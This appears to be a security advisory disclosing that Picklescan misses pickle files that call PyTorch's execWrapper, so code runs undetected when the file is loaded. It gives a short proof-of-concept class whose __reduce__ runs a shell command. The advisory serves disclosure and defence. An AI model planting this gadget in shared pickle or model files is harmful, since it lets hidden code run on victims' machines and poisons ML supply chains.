### Summary

Using torch.jit.unsupported_tensor_ops.execWrapper function, which is a pytorch library function to execute remote pickle file.

### Details

The attack payload executes in the following steps:

First, the attacker craft the payload by calling to torch.jit.unsupported_tensor_ops.execWrapper function in reduce method
Then when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.

### PoC

```

import torch.jit.unsupported_tensor_ops as unsupported_tensor_ops

class EvilTorchJitUnsupportedTensorOpsExecWrapper:
    def __reduce__(self):
        code = '__import__("os").system("whoami")'
        glob = {}
        loc = {}
        return unsupported_tensor_ops.execWrapper, (code, glob, loc)
```

### Impact

Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.
What is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.
Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.

### Corresponding

https://github.com/FredericDT
https://github.com/Qhaoduoyu